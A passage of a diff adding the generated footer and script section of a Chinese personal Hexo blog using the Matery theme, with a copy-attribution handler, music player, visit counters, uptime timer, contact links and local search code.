+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + 'From: xmhhmx的blog<br />'
+            + 'Author: HMX<br />'
+            + 'Link: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="song"
+                   id="472137749"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2024-2025</span>
+            
+            <span id="year">2024</span>
+            <a href="/about" target="_blank">HMX</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">131.8k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2024";
+                    var startMonth = "5";
+                    var startDate = "20";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:1282370648@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1282370648" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1282370648" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+    
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+    <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+    <!-- <script type="text/javascript" src="/js/fireworks.js"></script> -->
+
+    <!-- <script type="text/javascript">
+        //只在桌面版网页启用特效
+        var windowWidth = $(window).width();
+        if (windowWidth > 768) {
+            document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+        }
+    </script> -->
+    
+    <script src="/js/snow.js"></script>
+
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
